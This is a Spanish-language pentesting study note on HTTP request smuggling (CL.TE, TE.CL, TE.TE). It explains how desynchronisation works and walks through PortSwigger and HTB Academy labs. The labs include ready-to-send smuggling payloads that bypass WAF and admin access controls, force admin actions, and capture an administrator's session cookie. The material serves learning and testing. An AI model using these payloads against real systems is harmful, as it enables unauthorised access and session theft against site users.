# HTTP Request Smuggling (HTTP Desync Attack)

## Table of contents

- [HTTP Request Smuggling (HTTP Desync Attack)](#http-request-smuggling-http-desync-attack)
  - [Introduccion](#introduccion)
  - [¿Qué sucede en un ataque de contrabando de solicitudes HTTP?](#qu-sucede-en-un-ataque-de-contrabando-de-solicitudes-http)
  - [¿Cómo surgen las vulnerabilidades de contrabando de solicitudes HTTP?](#cmo-surgen-las-vulnerabilidades-de-contrabando-de-solicitudes-http)
    - [Content-Type](#content-type)
    - [Transfer-Encoding](#transfer-encoding)
  - [Cómo realizar un ataque Request Smuggling](#cmo-realizar-un-ataque-request-smuggling)
    - [vulnerabilidades CL.TE](#vulnerabilidades-clte)
    - [vulnerabilidades TE.CL](#vulnerabilidades-tecl)
    - [vulnerabilidades TE.TE (Obfuscando header TE)](#vulnerabilidades-tete-obfuscando-header-te)
  - [Cómo identificar vulnerabilidades HTTP Request Smuggling](#cmo-identificar-vulnerabilidades-http-request-smuggling)
    - [utilizando técnicas de temporización (Basadas en tiempo)](#utilizando-tcnicas-de-temporizacin-basadas-en-tiempo)
      - [CL.TE](#clte)
      - [TE.CL](#tecl)
    - [mediante respuestas diferenciales (Basadas en codigo de respuestas)](#mediante-respuestas-diferenciales-basadas-en-codigo-de-respuestas)
      - [CL.TE](#clte)
      - [TE.CL](#tecl)
  - [Explotacion](#explotacion)
    - [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)
    - [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
    - [Exploiting CL.TE vulnerability to do admin action (HTB Academy)](#exploiting-clte-vulnerability-to-do-admin-action-htb-academy)
      - [Ejercicio CL.TE](#ejercicio-clte)
    - [Exploiting TE.TE vulnerability to do admin action (HTB Academy)](#exploiting-tete-vulnerability-to-do-admin-action-htb-academy)
    - [Exploiting TE.CL vulnerability to access admin panel (HTB Academy)](#exploiting-tecl-vulnerability-to-access-admin-panel-htb-academy)
    - [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
    - [Exploiting HTTP request smuggling to deliver reflected XSS](#exploiting-http-request-smuggling-to-deliver-reflected-xss)

## Introduccion

**HTTP Request smuggling** es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP que se reciben de uno o más usuarios. Las vulnerabilidades de **HTTP Request smuggling** suelen ser de naturaleza crítica, lo que permite a un atacante eludir los controles de seguridad, obtener acceso no autorizado a datos confidenciales y comprometer directamente a otros usuarios de la aplicación.

## ¿Qué sucede en un ataque de contrabando de solicitudes HTTP?

Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end.

Cuando el servidor front-end reenvía solicitudes HTTP a un servidor back-end, normalmente envía varias solicitudes a través de la misma conexión de red back-end, porque esto es mucho más eficiente y eficaz. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente:

![[Pasted image 20230218222346.png]]

**_En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes._** De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpretan de manera diferente:

![[Pasted image 20230218222542.png]]

**_Aquí, el atacante hace que parte de su solicitud de front-end sea interpretada por el servidor de back-end como el inicio de la siguiente solicitud._**

## ¿Cómo surgen las vulnerabilidades de contrabando de solicitudes HTTP?

La mayoría de las vulnerabilidades de **HTTP request smuggling** surgen porque la especificación HTTP proporciona dos formas diferentes de especificar dónde termina una solicitud: el header `Content-Length` y el header `Transfer-Encoding`.

### Content-Type

especifica la longitud del cuerpo del mensaje en bytes. Por ejemplo:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling (11 caracteres)
```

### Transfer-Encoding

se puede usar para especificar que el cuerpo del mensaje usa codificación fragmentada. Esto significa que el cuerpo del mensaje contiene uno o más fragmentos de datos.

Cada fragmento consta de:

- el tamaño del fragmento en bytes (expresado en hexadecimal)
- seguido de una nueva línea
- seguido del contenido del fragmento
- un trozo de tamaño cero. 

Por ejemplo:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b (11 en hexadecinal)
q=smuggling (nueva linea + contenido)
0 (cero)
```

Dado que la especificación HTTP proporciona dos métodos diferentes para especificar la longitud de los mensajes HTTP, es posible que un solo mensaje utilice ambos métodos a la vez, de modo que entren en conflicto entre sí. 

**_La especificación HTTP intenta evitar este problema al indicar que si los headers `Content-Length` y `Transfer-Encoding`están presentes, entonces se debe ignorar el header `Content-Length`._** 

Esto podría ser suficiente para evitar la ambigüedad cuando solo un servidor está en juego, pero no cuando dos o más servidores están encadenados. En esta situación, pueden surgir problemas por dos motivos:

- Algunos servidores no admiten el header `Transfer-Encoding` en las solicitudes.
- Se puede inducir a algunos servidores que admiten el header `Transfer-Encoding` a no procesarlo si el encabezado está ofuscado de alguna manera.

Si los servidores front-end y back-end se comportan de manera diferente en relación con el header `Transfer-Encoding`  (posiblemente ofuscado), es posible que no estén de acuerdo con los límites entre las solicitudes sucesivas, lo que genera vulnerabilidades de **HTTP Request Smuggling**.

## Cómo realizar un ataque Request Smuggling

Los ataques de **Request Smuggling** implican colocar tanto el header `Content-Length` como el header `Transfer-Encoding`  en una sola solicitud HTTP y manipularlos para que los servidores front-end y back-end procesen la solicitud de manera diferente. 

La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

>[!note]
>Hacemos referencia a un proxy inverso como el **servidor frontend**.

- **CL.TE**: el servidor front-end usa el header `Content-Length` y el servidor back-end usa el header `Transfer-Encoding`.
- **TE.CL**: el servidor front-end usa el header `Transfer-Encoding` y el servidor back-end usa el header `Content-Length`.
- **TE.TE**: los servidores front-end y back-end admiten el header `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo ofuscando el header de alguna manera.

### vulnerabilidades CL.TE

Podemos realizar un simple ataque de la siguiente manera:

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0(\r\n)
(\r\n)
HELLO
```

>[!note]
>Los bytes `\r\n` entre parentesis se colocan cuando damos enter.

El servidor front-end procesa el header `Content-Length` y determina que el cuerpo de la solicitud tiene una longitud de 10 bytes, hasta el final de `HELLO`. Esta solicitud se reenvía al servidor back-end.

```bash
# 10 bytes
0\r\n\r\nHELLO
```

- El servidor back-end procesa el header `Transfer-Encoding` y, por lo tanto, trata el cuerpo del mensaje como si usara codificación fragmentada. 
- Procesa el primer fragmento, que se establece como de longitud cero, por lo que se trata como si terminara la solicitud. 
-  Dado que el cuerpo de la solicitud en la codificación fragmentada termina con el fragmento vacío con tamaño `0`, el servidor web analiza el cuerpo de la solicitud como:

```bash
0\r\n\r\n
```

Desde la perspectiva del servidor backend, estos bytes son, por lo tanto, el comienzo de la próxima solicitud HTTP. **Sin embargo, dado que la solicitud aún no está completa, el servidor web espera a que lleguen más datos al flujo TCP antes de procesar la solicitud.**

Creamos con éxito una desincronización entre el proxy inverso (frontend) y el servidor backend, ya que el proxy inverso y el servidor backend no están de acuerdo con los límites de la solicitud.

Ahora analicemos qué sucede si llega la próxima solicitud. Tenga en cuenta que esto puede ser una solicitud de una víctima desprevenida que visita el sitio vulnerable justo después de que creamos la desincronización con nuestra solicitud específicamente diseñada.

```http
GET / HTTP/1.1
Host: clte.htb
```

**_EL SERVIDOR FRONTEND LO VERIA ASI_**

![[Pasted image 20230512224135.png]]

Podemos ver que el cuerpo de la primera solicitud termina después `HELLO` y la solicitud posterior comienza con la `GET`.

**_EL SERVIDOR BACKEND LO VERIA ASI_**

![[Pasted image 20230512224249.png]]

Dado que el servidor web cree que la primera solicitud finaliza después de los bytes `0\r\n\r\n`, los bytes `HELLO` se anteponen a la solicitud posterior de modo que el método de solicitud se cambió de `GET` a `HELLOGET`. 
Dado que se trata de un método HTTP no válido, lo más probable es que el servidor web responda con un  mensaje `HTTP 405 - Method not allowed` de error aunque la segunda solicitud utilice un método HTTP válido.

### vulnerabilidades TE.CL

Podemos realizar un simple ataque de la siguiente manera:

```http
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5(\r\n)
HELLO(\r\n)
0(\r\n)
(\r\n)
```

El servidor frontend utiliza codificación fragmentada, por lo que analiza el cuerpo de la solicitud para que contenga un solo fragmento con una longitud de 5 bytes:

```bash
HELLO
```

El `0` al ultimo  se analiza como el fragmento vacío, lo que indica que el cuerpo de la solicitud ha concluido.

El servidor backend utiliza el header CL para determinar la duración de la solicitud. El header CL proporciona una longitud de **3 bytes**, lo que significa que el cuerpo de la solicitud se analiza como los siguientes 3 bytes:

```bash
5\r\n
```

En particular, los bytes `HELLO\r\n0\r\n\r\n` no se consumen del flujo TCP. Esto significa que el servidor web cree que esto marca el comienzo de una nueva solicitud HTTP. Una vez más, creamos con éxito una desincronización entre el servidor frontend y el servidor backend.

**Ahora analicemos qué sucede si llega la próxima solicitud.** Supongamos que la siguiente solicitud que llega al servidor frontend se ve así:

```http
GET / HTTP/1.1
Host: tecl.htb
```

**_EL SERVIDOR FRONTEND LO VERIA ASI_**

![[Pasted image 20230513001541.png]]

Podemos ver que el cuerpo de la primera solicitud termina después del fragmento vacío y la solicitud posterior comienza con `GET`.

**_EL SERVIDOR BACKEND LO VERIA ASI_**

![[Pasted image 20230513001701.png]]

Dado que el servidor web cree que la primera solicitud finaliza después de los bytes `5\r\n`, los bytes `HELLO\r\n0\r\n\r\n` se anteponen a la solicitud posterior. 

En este caso, **lo más probable es que el servidor backend responda con un mensaje de error** ya que los bytes `HELLO` no son un comienzo válido de una solicitud HTTP.

>[!success]
>Para enviar esta solicitud usando Burp Repeater, primero deberá ir al menú del repetidor y asegurarse de que la opción "Actualizar contenido-longitud" no esté marcada.
>
>Debe incluir la secuencia final `\r\n\r\n` que sigue al final `0`.

El servidor front-end procesa el header `Transfer-Encoding` y, por lo tanto, trata el cuerpo del mensaje como si usara una codificación fragmentada. 

### vulnerabilidades TE.TE (Obfuscando header TE)

Aquí, los servidores front-end y back-end admiten el header `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo ofuscando el encabezado de alguna manera.

**_Para identificar una vulnerabilidad de contrabando de solicitudes TE.TE, debemos engañar al servidor frontend o al servidor backend para que ignoren el encabezado TE._**

Hay formas potencialmente infinitas de ofuscar el header `Transfer-Encoding`. 

Por ejemplo:

|**Descripción**|**Header**|
|:------:|:------:|
|Coincidencia de subcadena|`Transfer-Encoding: testchunked` - `Transfer-Encoding: xchunked`|
|Espacio en el nombre del encabezado|`Transfer-Encoding : chunked`|
|Separador de pestañas horizontales|`Transfer-Encoding:[\x09]chunked` - `Transfer-Encoding:[tab]chunked`|
|Separador de pestañas verticales|`Transfer-Encoding:[\x0b]chunked`|
|Espacio principal|`Transfer-Encoding: chunked` - `[space]Transfer-Encoding: chunked`|
|Uso de saltos de linea|`X: X[\n]Transfer-Encoding: chunked` - `Transfer-Encoding[\n]: chunked`|

>[!note]
>Reemplazar `[\n]` con un `enter`.

>[!note2]
>Las secuencias `[\x09]` y `[\x0b]` no son las secuencias de caracteres literales utilizadas en la ofuscación. Más bien, denotan el carácter de tabulación horizontal (ASCII `0x09`) y el carácter de tabulación vertical (ASCII `0x0b`).

Para descubrir una vulnerabilidad TE.TE, es necesario encontrar alguna variación del header `Transfer-Encoding` de modo que solo uno de los servidores front-end o back-end lo procese, mientras que el otro servidor lo ignore.

Como ejemplo, supongamos un escenario en el que podemos engañar al servidor frontend para que ignore el header TE con el método `Horizontal Tab` (tabulacion), mientras que el servidor backend lo analiza a pesar de la tabulacion. **_Dado que el servidor frontend recurre al header CL, la identificación y la explotación serían las mismas que en un  escenario `CL.TE` ._**

Copiemos la siguiente solicitud en una pestaña de Burp Repeater:

```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

Ahora reemplacemos el espacio que separa el header TE del valor `chunked` con una pestaña horizontal (tabulacion). Podemos hacerlo cambiando a la vista `Hex` en la pestaña Repetidor y reemplazando directamente el espacio ( `0x20`) a una pestaña horizontal ( `0x09`):

![[Pasted image 20230512232847.png]]

Cuando ahora enviamos la siguiente solicitud dos veces en rápida sucesión, la segunda respuesta debería dar como resultado un código de estado HTTP `405 - Method not allowed` ya que la solicitud se cambió de `GET` a `HELLOGET`.

![[Pasted image 20230512233130.png]]
 
## Cómo identificar vulnerabilidades HTTP Request Smuggling

### utilizando técnicas de temporización (Basadas en tiempo)

#### CL.TE

Si una aplicación es vulnerable a la variante CL.TE, el envío de una solicitud como la siguiente a menudo causará un retraso de tiempo:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1 (\r\n)
A
X
```

Dado que el servidor front-end usa el header `Content-Length`, solo reenviará una parte de esta solicitud, omitiendo el `X`. El servidor back-end usa el header `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causará un retraso de tiempo observable.

#### TE.CL

Si una aplicación es vulnerable a la variante TE.CL, el envío de una solicitud como la siguiente a menudo causará un retraso de tiempo:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0 (\r\n)
(\r\n)
X
```

Dado que el servidor front-end usa el header `Transfer-Encoding`, solo reenviará una parte de esta solicitud, omitiendo el `X`. El servidor back-end usa el header `Content-Length`, espera más contenido en el cuerpo del mensaje y espera a que llegue el contenido restante. Esto causará un retraso de tiempo observable.

### mediante respuestas diferenciales (Basadas en codigo de respuestas)

Esto implica enviar dos solicitudes a la aplicación en rápida sucesión:

-   Una solicitud de "ataque" diseñada para interferir con el procesamiento de la siguiente solicitud.
-   Una solicitud "normal".

Por ejemplo, suponga que la solicitud normal se ve así:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Esta solicitud normalmente recibe una respuesta HTTP con el código de estado 200, que contiene algunos resultados de búsqueda.

#### CL.TE

Para confirmar una vulnerabilidad CL.TE, enviaría una solicitud de ataque como esta:

```HTTP
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e (\r\n)
q=smuggling&x= (\r\n)
0
(\r\n)
GET /404 HTTP/1.1
Foo: x
```

Si el ataque tiene éxito, el servidor de back-end trata las dos últimas líneas de esta solicitud como pertenecientes a la siguiente solicitud que se recibe. Esto hará que la siguiente solicitud "normal" se vea así:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**_Dado que esta solicitud ahora contiene una URL no válida, el servidor responderá con el código de estado 404, lo que indica que la solicitud de ataque realmente interfirió con ella._**

#### TE.CL

Para confirmar una vulnerabilidad TE.CL, enviaría una solicitud de ataque como esta:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c(\r\n)
GET /404 HTTP/1.1(\r\n)
Host: vulnerable-website.com(\r\n)
Content-Type: application/x-www-form-urlencoded(\r\n)
Content-Length: 144(\r\n)

x=(\r\n)
0(\r\n)
(\r\n)
```

>[!success]
>Debe incluir la secuencia final `\r\n\r\n`que sigue al final `0`.

Si el ataque tiene éxito, el servidor de back-end trata todo lo que sigue a `GET /404` como perteneciente a la siguiente solicitud que se recibe. Esto hará que la siguiente solicitud "normal" se vea así:

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

**_Dado que esta solicitud ahora contiene una URL no válida, el servidor responderá con el código de estado 404, lo que indica que la solicitud de ataque realmente interfirió con ella._**

## Tecnicas para evadir WAF + HTTP Request Smuggling

Puede haber casos que la pagina vulnerable a **HTTP Request Smuggling** tenga una proteccion WAF. En esos casos podemos intentar realizar el ataque con las siguientes consideraciones.

### BurpSuite Repeater Tab Group

En la pestaña de repeater podemos crear un grupo de pestañas con diferentes peticiones y las podemos mandar secuencialmente por el mismo canal TCP, esto ayuda a evadir el WAF.

Tenemos las siguientes 2 peticiones que pestañas diferentes:

**_PESTAÑA 1_**

Esta peticion es la que realiza el ataque:

```http
POST / HTTP/1.1
Host: 104.248.174.109:32256
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: xchunked

5
HELLO
0
```

**_PESTAÑA 2_**

Esta peticion es laque comprueba:

```http
GET / HTTP/1.1
Host: 104.248.174.109:32256
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

ahora en el repeater damos click derecho en cualquier peticion y damos la siguienet opcion:

![[Pasted image 20230516151030.png]]

damos un nombre a l grupo y seleccionamos las pestañas:

![[Pasted image 20230516151110.png]]

ahora antes de enviar seleccionamos lo siguiente:

![[Pasted image 20230516151152.png]]

esto enviara a traves del mismo canal TCP (Misma conexion)

>[!note]
>No olvide desmarcar la opcion de actualizar el `Content-Length`.

lo enviamos y veremos que en la peticion GET se tiene el error esperado de la desincronizacion:

![[Pasted image 20230516151340.png]]

### Bypass Block URL 

Supongamos que el WAF bloquea cualquier URL que contenga `/admin`. El panel de administracion se encuentra ahi, **si la pagina es vulnerable a HTTP Request Smuggling** podemos obtener el contenido del panel administrador y evadir el WAF:

>[!note]
>Se debe adaptar segun el tipo de vulnerabilidad: **CL.TE**, **TE.TE** o **TE.CL**.

```http
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb


0

GET /404 HTTP/1.1
Host: tecl.htb
```

**_ASI LO VE EL WAF_**

![[Pasted image 20230516151718.png]]

**_ASI LO VE EL BACKEND_**

![[Pasted image 20230516151831.png]]

## Explotacion

### HTTP request smuggling, basic CL.TE vulnerability

para probar el tipo **CL.TE** hacemos la siguiente:

![[Pasted image 20230220183002.png]]

1. Cambiamos el metodo a POST (para que acepte enviar body)
2. el header `connection` le damos el valor de `keep-alive`
3. colocamos los headers `Content-Length` y `Transfer-Encoding`
4. la longitud de body es 6 (4 espacios + 0 + G)
5. 0 determina el fin de `Transfer-Encoding`
6. El servidor tomara G como la comienzo de otra solicitud
7. la siguiente solicitud se concatenara una"G"

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

En una pagina tenemos acceso a la raiz `/` pero no al panel adminstrativo `/admin`.

se tiene un tipo de vulnerabilidad **CL.TE** esta sera la estructura:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0 (\r\n)
(\r\n)
GET / HTTP/1.1 (peticion 2)
```

interceptamos la peticion original:

![[Pasted image 20230220200828.png]]

vamos a cambiar de metodo la peticion:

![[Pasted image 20230220201012.png]]

eliminamos todos los headers y solo dejamos el header `host`, `Content-Type` y `Content-Length` y vemos si responde la pagina (esto para simplificar las cosas):

![[Pasted image 20230220201135.png]]

vamos a agregar el header `Transfer-Encoding: chunked` y vamos a darle el formato de CL.TE:

```http
POST / HTTP/1.1
Host: 0a90009d030d6cc4c09bb879009d005b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0a90009d030d6cc4c09bb879009d005b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

qwerty
```

1. el `0` indica la terminacion del `Transfer-Encoding` (para el backend)
2. despues agrego una peticion al `/admin` se puede copiar el post de arriba con los headers y cambiar el verbo, la URI y no colocar `Transfer-Encoding`
3. se pasa un parametro en la segunda peticion que puede ser cualquier valor, solo tiene que tener un `Content-Length` suficiente.
4. la longitud de la peticion POST (`167`) se lo calcula desde el final hasta despues del `0`:

![[Pasted image 20230220202258.png]]

nos responde que el panel `/admin` esta disponible para usuarios locales, por lo que podemos manipular el header `host: localhost`:

![[Pasted image 20230220202830.png]]

a nos muestra el admin panel, por lo que hemos podido evadir el access control, ahora podemos eliminar un usuario si conocemos la URI:

![[Pasted image 20230220203015.png]]

![[Pasted image 20230220203205.png]]

### Exploiting CL.TE vulnerability to do admin action (HTB Academy)

Supongamos que queremos obligar al usuario administrador a promover nuestra cuenta de usuario con privilegios bajos a un usuario administrador, lo que se puede hacer con el punto final `/admin.php?promote_uid=2` donde nuestra identificación de usuario es 2.

Podemos obligar al usuario administrador a hacerlo enviando la siguiente solicitud:

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0 (\r\n)
(\r\n)
POST /admin.php?promote_uid=2 HTTP/1.1
Dummy:
```

- El encabezado CL indica una longitud de cuerpo de solicitud de `52` bytes que incluye todo el cuerpo como se muestra arriba hasta la secuencia `Dummy:`.
- Sin embargo, el cuerpo de la solicitud comienza con los bytes `0\r\n\r\n`que representan el fragmento vacío en la codificación fragmentada, por lo que finaliza el cuerpo de la solicitud antes de tiempo si se utiliza la codificación fragmentada.

**_Si esperamos a que el usuario administrador acceda a la página, que debería tardar unos 10 segundos, nuestro usuario ha sido ascendido. Entonces, investiguemos qué sucedió exactamente._**

El usuario administrador accede a la página utilizando su cookie de sesión con una solicitud como esta:

```http
GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```

El usuario administrador simplemente accede al índice del sitio web, por lo que no se debe realizar ninguna acción.

**_EL SERVIDOR FRONTEND LO VERIA ASI_**

![[Pasted image 20230512225601.png]]

**_EL SERVIDOR BACKEND LO VERIA ASI_**

![[Pasted image 20230512225651.png]]

>[!NOTE]
>Necesitamos agregar una línea separada con la palabra clave `Dummy` a nuestra primera solicitud para "ocultar" la primera línea de la solicitud del usuario administrador `GET / HTTP/1.1` como un valor de encabezado HTTP para preservar la sintaxis de la sección de encabezado de la solicitud.

#### Ejercicio CL.TE

Hay un endpoint que revela una bandera pero solo el administrador tiene permisos, obliguemos al usuario administrador a revelar la bandera. Endpoint: `/admin.php?reveal_flag=1`

![[Pasted image 20230512231239.png]]

Interceptamos el index de la pagina `/` y lo modificamos:

```http
POST / HTTP/1.1
Host: 165.227.232.214:31437
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin.php?reveal_flag=1 HTTP/1.1
Hust:
```

>[tip]
>Da igual es nombre que le pongamos al header de la siguiente peticion `Hust:`, solo asegurese de que coincida con el `Content-Length`.

esperamos 10 segundos y al recargar el endpoint si el parametro: `/admin.php` nos mostrara automaticamente ela bandera

![[Pasted image 20230512231218.png]]

### Exploiting TE.TE vulnerability to do admin action (HTB Academy)

Hay un endpoint que revela una bandera pero solo el administrador tiene permisos, obliguemos al usuario administrador a revelar la bandera. Endpoint: `/admin?reveal_flag=1`

> El exploit es sensible al tiempo, por lo que debe enviar su carga útil justo antes de que el administrador acceda a la página. Enviar la solicitud periódicamente una vez cada segundo debería funcionar. El administrador accede a la página cada 10 segundos.

primero vamos a identificar con que ofuscacion podemos generar un codigo de estado `405 - Method not allowed`, despues de probar todos, el que funciono fue el uso de tabulacion vertical (`0x0b`):

```http
POST / HTTP/1.1
Host: 178.128.169.240:31850
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

![[Pasted image 20230512235904.png]]

reemplazamos con el byte (`0x0b`):

- seleccionamos el byte (`0x20`) (click sobre el byte)
- click derecho y damos la opcion **insert byte**

![[Pasted image 20230513000046.png]]

- colocamos el byte (`0x0b`)

![[Pasted image 20230513000103.png]]

![[Pasted image 20230513000155.png]]

lo enviamos 2 veces y vemos que con ese byte obtenemos el estado:

![[Pasted image 20230513000629.png]]

ahora vamos a hacer que el administrador nos revele la flag:

```http
POST / HTTP/1.1
Host: 178.128.169.240:31850
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Transfer-Encoding: chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
Hust:
```

>[!note]
>Tenemos que volver a cambiar el byte.

al recargar el enpoint `/admin` (despues de varios intentos por segundo durante 10 segundos), nos revelara la flag:

![[Pasted image 20230513002226.png]]

### Exploiting TE.CL vulnerability to access admin panel (HTB Academy)

>[!note]
>**_Explote HTTP Smuggling para evitar el WAF y acceder al portal de administración._**

>[!note2]
>WAF funciona simplemente bloqueando todas las solicitudes que contienen la palabra clave `admin` en la URL.

vamos a identificar la vulnerabilidad **TE.CL** con una simple PoC en la raiz de la pagina:

Tenemos las siguientes 2 peticiones que pestañas diferentes:

**_PESTAÑA 1_**

Esta peticion es la que realiza el ataque:

```http
POST / HTTP/1.1
Host: 104.248.174.109:32256
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: xchunked

5
HELLO
0
```

**_PESTAÑA 2_**

Esta peticion es laque comprueba:

```http
GET / HTTP/1.1
Host: 104.248.174.109:32256
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

ahora en el repeater damos click derecho en cualquier peticion y damos la siguienet opcion:

![[Pasted image 20230516151030.png]]

damos un nombre a l grupo y seleccionamos las pestañas:

![[Pasted image 20230516151110.png]]

ahora antes de enviar seleccionamos lo siguiente:

![[Pasted image 20230516151152.png]]

esto enviara a traves del mismo canal TCP (Misma conexion)

>[!note]
>No olvide desmarcar la opcion de actualizar el `Content-Length`.

lo enviamos y veremos que en la peticion GET se tiene el error esperado de la desincronizacion:

![[Pasted image 20230516151340.png]]

para la explotacion hacemos lo mismo con un grupo de pestañas en el repeater:

Repeater - Tab group

```http
GET /404 HTTP/1.1
Host: 178.128.169.240:32547
Content-Length: 4
Transfer-Encoding: xchunked

34
GET /admin HTTP/1.1
Host: 178.128.169.240:32547
(\r\n)
(\r\n)
0
```

```http
GET /404 HTTP/1.1
Host: 178.128.169.240:32547
```


lo lanzamos y veremos que la segunda peticion tiene un estado 200 con el contenido del panel `/admin`:

![[Pasted image 20230516153242.png]]

lo renderizamos:

![[Pasted image 20230516153311.png]]


### Bypass security controls

or ejemplo, suponga que una aplicación web usa un WAF para bloquear todas las solicitudes a la ruta `/internal/` que no provienen de la red interna de una empresa. Podemos eludir esto fácilmente utilizando el contrabando de solicitudes CL.TE o TE.CL. Una carga útil para explotar una vulnerabilidad CL.TE podría verse así:

```http
POST / HTTP/1.1
Host: vuln.htb
Content-Length: 64
Transfer-Encoding: chunked

0

POST /internal/index.php HTTP/1.1
Host: localhost
Dummy: 
```

Mientras que una carga útil para una vulnerabilidad TE.CL podría verse similar a esto:

```http
GET / HTTP/1.1
Host: vuln.htb
Content-Length: 4
Transfer-Encoding: chunked

35
GET /internal/index.php HTTP/1.1
Host: localhost


0
```

### Robar datos de usuario

Veamos un ejemplo de una funcionalidad de comentarios:

![[Pasted image 20230516154747.png]]

la solicitud viaja de la siguiente manera:

```http
POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded

name=htb-stdnt&comment=Hello+World%21
```

Robemos la cookie de sesión del usuario administrador aprovechando la vulnerabilidad **CL.TE** para obtener acceso al panel administrador `/admin`. Podemos lograr esto obligando al usuario administrador a publicar su solicitud como un comentario en la sección de comentarios con la siguiente solicitud:

```http
POST / HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Transfer-Encoding: chunked

0

POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

name=hacker&comment=test
```

despues de eso el usuario administrador puede enviar una peticion y esto se capturaria asi en los servidores:

veamos que sucede en los servidores, como es un caso **CL.TE**:

**_El servidor frontend lo ve asi_**

![[Pasted image 20230516155145.png]]

Dado que el servidor frontend usa el encabezado **CL** para determinar la longitud de la solicitud, reenvía nuestra solicitud de contrabando al servidor backend en el cuerpo de la primera solicitud. El servidor frontend ve nuestra solicitud POST a `/` y la solicitud GET del administrador a `/`.

**_El servidor backend lo ve asi_**

![[Pasted image 20230516155338.png]]

la segunda peticion toma como parte del comentario la peticion del usuaripo administrador incluyendo los headers y la cookie de sesion.

![[Pasted image 20230516155608.png]]

Al explotar esto, debemos tener en cuenta lo siguiente:

- Necesitamos determinar un valor de trabajo para el header`Content-Length` en la solicitud de contrabando. Si es demasiado pequeño, no obtendremos suficientes datos de la solicitud del administrador. Si es demasiado grande, es posible que no obtengamos ningún dato, ya que es más grande que la solicitud de administración completa, y el servidor web se agota esperando que lleguen más datos. Podemos determinar un valor que funcione para nosotros con prueba y error
- Necesitamos agregar todos los parámetros necesarios a la solicitud de contrabando. Por ejemplo, si estamos realizando una acción autenticada, debemos agregar nuestra cookie de sesión en el header `Cookie` de la solicitud de contrabando.

### Explotación masiva de XSS reflejado

